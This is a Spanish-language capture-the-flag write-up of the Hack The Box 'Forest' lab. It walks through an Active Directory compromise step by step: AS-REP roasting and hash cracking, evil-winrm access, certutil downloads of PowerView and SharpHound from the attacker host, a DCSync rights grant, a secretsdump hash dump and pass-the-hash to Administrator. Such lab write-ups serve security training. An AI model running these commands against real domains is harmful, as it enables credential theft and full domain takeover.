---
layout:   post
title:    "Write Up Forest."
subtitle: "Starting-Point"
category:   HTB
tags:      [Easy,Windows,Kerberoasting,PowerView,ASREPRoast,BloodHound,SharpHound,Ldap,RCP,axfr,EvilWinRM,SMB,Active-Directory,Write-Up-Machine,           Starting-Point,OSCP,OSEP]
---
![list](/assets/img/forest/forest.png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.10.161 -oG allports
```
![list](/assets/img/forest/Kali-2022-09-13-21-43-04.png){:.lead width="800" height="100" loading="lazy"}



El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que versiones y servicios que corren en los mismo de ahi podremos determinara posibles vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -sCV p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49957 10.10.10.161 -oN target
```

![list](/assets/img/forest/Kali-2022-09-13-21-45-55.png){:.lead width="800" height="100" loading="lazy"}



El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***
## Analisis de vulnerabilidades

Con todos esos puetos abiertos es pisible asumir que estamos frente a un `Domain Controler`imediatamente lo que debemos hacer es tratar de explotar el smb,esto lo hacemos con crackmapexec, smbclient,smbmap entre otros .

Con crackmapexec vemos si el smb esta firmado ademas del dominio entre ota informacion.

![list](/assets/img/forest/Kali-2022-09-13-21-53-57.png){:.lead width="800" height="100" loading="lazy"}

```bash
crackmapexec smb 10.10.10.161
```

{:.note}
El doninio es `htb.local`,lo agrgamos al `/etc/hosts`.


![list](/assets/img/active/Kali-2022-09-16-23-10-48.png){:.lead width="800" height="100" loading="lazy"}

```bash
smbclient -L 10.10.10.161 -N
```

{:.note}
Listamos los shares.

Ya que esta el puero 53 abierto vamos a probar el ataque de domain zone transfer `axfr`, esto lo hacemos con la herramienta dig.

![list](/assets/img/forest/Kali-2022-09-13-22-00-31.png){:.lead width="800" height="100" loading="lazy"}

```bash
dig @10.10.10.161 htb.local
```

{:.note}
Enumeramos los servidores de correo y los incorporamos al `/etc/hosts`.

```bash
dig @10.10.10.161 htb.local axfr
```

{:.note}
El ataque axfr no es posible seguimos con otra cosa.

Exite varias herramentas que enumeran usauarios y grupos de smb y rcp, podemos usar `lookupsid.py` y `rcpclient` pero ene ste caso utilizaremos `rcpclient`.

```bash
rpcclient -U "" 10.10.10.161 -N
```

{:.note}
Ya que no tenemos usuarios aun lo hacemos con una null sesion, una ves dentro con enumdomusers para usuarios y enumdomgroups para grupos.


Con los usuarios que obtubimos anteriormente podemos grepearlos o simplmente copiarlos y meterlos aun archivo txt llamado users.txt, y procedemos con el ataque ASREPRoast para esto podemos usar `kerbrute`, al caul al listado de usuario debemos agregarle el `@htb.local`, en este caso vamos usar [GetNPUsers.py].


![list](/assets/img/forest/Kali-2022-09-13-22-03-19.png){:.lead width="800" height="100" loading="lazy"}

```bash
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP "[.*?]" | grep -v "0x" | tr -d "[]" > users
```

{:.note}
Estamos agregando los usuarios a un diccionario users para proceder con el ataque [ASREPRoast].


[ASREPRoast]: https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html#:~:text=El%20ASREPRoast%20es%20una%20t%C3%A9cnica,requiere%20pre%2Dautenticaci%C3%B3n%20en%20kerberos.

[GetNPUsers.py]: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

![list](/assets/img/forest/Kali-2022-09-13-22-56-08.png){:.lead width="800" height="100" loading="lazy"}

```bash
GetNPUsers.py htb.local/ -no-pass -usersfile users
```

{:.note}
Obtenemos un hash que gusrdaremos en un archivo llamado hash que prodeceremos a crackear con `John The Ripper`.

```bash
john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```

{:.note}
La contraseña es`s3rvice` y el usuario es `svc-alfresco`.


***
## Explotacion

Con cracmapexec verificamos si las credeciales son validas.

![list](/assets/img/forest/Kali-2022-09-13-23-09-14.png){:.lead width="800" height="100" loading="lazy"}


```bash
crackmapexec smb 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
```

{:.note}
Son credenciales validas.

```bash
crackmapexec smb 10.10.10.161 -u "svc-alfresco" -p "s3rvice" --shares
```

{:.note}
NETLOGON y SYSVOL son shares alos que tenemos accesos.

```bash
crackmapexec winrm 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
```

{:.note}
Esto lo hacemos para comprobar si podemos acceder con EvilWimRM.

![list](/assets/img/forest/Kali-2022-09-13-22-40-01.png){:.lead width="800" height="100" loading="lazy"}

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
{:.note}
La flag esta en el ecritorio del usuario no privilegiado.

![list](/assets/img/forest/Kali-2022-09-13-23-26-50.png){:.lead width="800" height="100" loading="lazy"}

***
## Escalacion de privilegios 

Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles vectores para escalar de privilegios.

Podemos probar tambien kerberosting attack ya tenemos el dominio + un usuario + una contraseña  podemos probar un ataque [Kerberosting].

[Kerberosting]: https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html

![list](/assets/img/forest/Kali-2022-09-14-00-16-30.png){:.lead width="800" height="100" loading="lazy"}

```bash
GetUserSPNs.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -request
```

{:.note}
No es posible el ataque.

Con `ladapdoamindump` enumaremos los grupos, como el output que nos reporta suele se mucho no crearemos otro direcctorio,y luego nos montaremos un servidor con python y el cual desde el navegador podremos investigar bien sobre que usuario pertenece a que grupo y que privilegios tienen etc.

![list](/assets/img/forest/Kali-2022-09-13-23-23-27.png){:.lead width="800" height="100" loading="lazy"}

```bash
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161
```

![list](/assets/img/forest/Kali-2022-09-13-23-21-47.png){:.lead width="800" height="100" loading="lazy"}

Utilizare bloodhound-python para recolectaar informacion.json para cargar en bloodhund. 

![list](/assets/img/forest/Kali-2022-09-13-23-21-44.png){:.lead width="800" height="100" loading="lazy"}


```bash
bloodhound-python -c All -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local
```

En este caso vamos a enumerar posibles vectores para escalar privileguios con bloodHound.

```bash
neo4j console
```

{:.note}
Arrancamos neo4j que comparte un servicio por el puero 4747 y te loogeas si ya los has hecho habres el bloodhound.

```bash
bloodhound &> /dev/null & disown
```

{:.note}
Independizamos el proceso.



Otra opcion es con SharpHound recolectar la misma info atraves de la maquina victima para esto debemos trasferir el binario a la maquina victima, desce la ubicacion del binarion en ta maquina atacate levatamos un servidor web con pyton y en la maquina victima hacemos el siguite comado.

```bash
certutil.exe -urlcache -split -f http://10.10.14.15/SharpHound.ps1 SharpHound.ps1
```

```bash
Import-Module .\SharpHound.ps1
```

```bash
Invoke-BloodHound -CollectionMethod All
```

Nos arroga un archivo.zip que luego no lo pasamos a la maquina atacate y de ahi lo cargamos en el `bloodhound` para interpetar los datos.

![list](/assets/img/forest/Kali-2022-09-14-00-12-45.png){:.lead width="800" height="100" loading="lazy"}

![list](/assets/img/forest/blood.png){:.lead width="800" height="100" loading="lazy"}

```powershell
download C://Users/svc_alfresco/Desktop/{archivo.zip} data.zip
```

Bloodhound nos muestra como el camino para convertirnos en superusuario.

Nos mustra ademas las acciones y coamdos que debemos tomar cara cosegirt el root.

![list](/assets/img/forest/blood2.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
A estos comandos les vamosa retocar un poquito.


Creamos un usuario y contraseña para agregarlo al dominio 

![list](/assets/img/forest/Kali-2022-09-14-00-45-23.png){:.lead width="800" height="100" loading="lazy"}

```powershell
net user axel123 Password123! /add /domain
```

Asignamos al usuario al grupo exchange.

![list](/assets/img/forest/Kali-2022-09-14-00-27-36.png){:.lead width="800" height="100" loading="lazy"}

Verificamos que ya este en grupo.

![list](/assets/img/forest/Kali-2022-09-14-00-27-59.png){:.lead width="800" height="100" loading="lazy"}

```powershell
net group "Exchange Windows Permissions" axel123 /add
```

Seteamos el privilegio DCsync.

![list](/assets/img/forest/Kali-2022-09-14-00-48-15.png){:.lead width="800" height="100" loading="lazy"}

```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```
Definimos las credenciales.

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\axel123', $SecPassword)
```

Descargamos el binario de PowerView-ps1 y lo traemos a la maquina victima el cual ejecuta la funcion para asignar el privilegio y estas credenciales al dominio.


![list](/assets/img/forest/Kali-2022-09-14-00-52-39.png){:.lead width="800" height="100" loading="lazy"}

```bash
certutil.exe -urlcache -split -f http://10.10.14.15/PowerView.ps1 PowerView.ps1
```

```bash
Import-Module .\PowerView.ps1
```

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,dc=local" -PrincipalIdentity axel123 -Rights DCSync
```

Una vez echo eso usaremos la herramienta [secretsdump.py], este script se encarga de realizar un volcado completo de los SAM/LSA Secrets, credenciales cacheadas, información sensible almacenada en el registro y los hashes NTLM del sistema.

[secretsdump.py]: https://thehackerway.com/2021/05/24/network-hacking-con-impacket-parte-3/#:~:text=Volcado%20de%20%C2%ABWindows%20Secrets%C2%BB%20con,los%20hashes%20NTLM%20del%20sistema.

![list](/assets/img/forest/Kali-2022-09-14-01-05-22.png){:.lead width="800" height="100" loading="lazy"}

```bash
secretsdump.py htb.locat/axel123@10.10.10.161
```

{:.note}
Nos muestra los secretos de la mayoria de todos los usuarios peor elque nos interesa en el de Administrator, con el cual podemos hacer pass de hash  `htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::` para ingresar al usuario privilegiado de la siguiente manera.

{:.note}
Para hacer pass de hash solo nos interesa el ultimo tercio del hash de administrator.

![list](/assets/img/forest/Kali-2022-09-14-01-09-03.png){:.lead width="800" height="100" loading="lazy"}

```powershell
crackmapexec winrm 10.10.10.161 -u "Administrator" -H "32693b11e6aa90eb43d32c72a07ceea6"
```

{:.note}
Comprobamos si las credenciales son validas para EvilWinRM.

![list](/assets/img/forest/Kali-2022-09-14-01-12-58.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Ingresamos.

![list](/assets/img/forest/Kali-2022-09-14-01-13-39.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La flag esta en el ecritorio del usuario priviligiado.

***
```bash
🎉 Felicitaciones ya has comprometido Forest de Hack The Box. 🎉
```
{:.centered}
***

Back to [Beginner Track Active Directory](2022-09-21-Beginner-Track-AD.md){:.heading.flip-title}
{:.read-more}
